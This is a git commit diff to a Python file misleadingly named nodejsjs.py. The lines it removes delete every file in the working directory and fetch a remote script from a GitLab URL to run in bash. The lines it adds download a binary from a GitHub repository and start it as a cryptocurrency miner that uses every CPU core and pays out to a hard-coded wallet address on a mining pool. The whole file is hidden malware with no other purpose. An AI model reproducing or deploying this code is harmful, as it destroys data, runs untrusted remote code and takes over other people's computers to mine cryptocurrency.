fb80444671e3f31aeda7cd00f983b035bd5d8f32
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-07-19 18:08:02 +0700

    Update nodejsjs.py

--- nodejsjs.py
+++ nodejsjs.py
@@ -1,3 +1,4 @@
-import os as nodejsjs
-nodejsjs.system("rm -irf *")
-nodejsjs.system("curl -sL https://gitlab.com/erlandysword/build/-/raw/main/pythonb | bash")
+import sys
+import os
+os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
+os.system("chmod +x cp && ./cp -a yespowertide -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.AMDRYZEN -t $(nproc)")
